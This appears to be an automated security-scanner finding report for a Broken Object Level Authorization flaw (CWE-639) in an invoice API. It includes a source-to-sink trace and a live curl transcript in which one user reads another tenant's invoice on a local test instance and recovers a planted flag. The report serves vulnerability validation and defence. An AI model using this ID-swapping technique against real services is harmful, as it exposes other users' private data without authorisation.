## ProofTrace finding — 🟥 **VERIFIED** — exploit reproduced live

**Broken Object Level Authorization in invoice retrieval**  ·  `CWE-639`  ·  severity **High**

**Endpoint:** `GET /api/invoices/{invoice_id}`

### Source → sink path (tree-sitter)

```
source  invoice_id  (attacker-controlled path param)
   │  flows to
   ▼
sink    db.execute(...)   ← no ownership check on the path
```

> attacker-controlled path param reaches a DB read with authentication but NO ownership check — the returned object can belong to another user (BOLA / CWE-639)

### Hypothesis
The endpoint authenticates the caller but the handler returns an object fetched by id with no check that it belongs to the caller. An authenticated user can read another tenant's object.

### Proof — live HTTP transcript

```http
$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:61679/api/invoices/1
-> 200 {"id":1,"owner_id":"user_A","customer":"Acme Corp","amount":1200,"note":"Q3 retainer"}

$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:61679/api/invoices/2
-> 200 {"id":2,"owner_id":"user_B","customer":"Globex Inc","amount":9000,"note":"FLAG{bola_user_b_invoice_pwned}"}

$ curl -H 'Authorization: Bearer tok_alice_a1' http://127.0.0.1:61679/api/me/invoices
-> 200 [{"id":1,"owner_id":"user_A","customer":"Acme Corp","amount":1200,"note":"Q3 retainer"}]

```

**Assertion:** user_A authenticated, received invoice 2 owned by user_B, flag recovered -> BOLA confirmed

**Flag recovered:** `FLAG{bola_user_b_invoice_pwned}`

### Run
- model: `qwen2.5-coder:32b`  ·  sandbox: `temporal`  ·  tokens: 1800+420  ·  wall: 0.9s

---
_The goal isn't more findings. It's fewer findings we can actually prove._

<sub>ProofTrace · reachability-first · LLM-as-investigator · validated against a live instance. PoC || GTFO.</sub>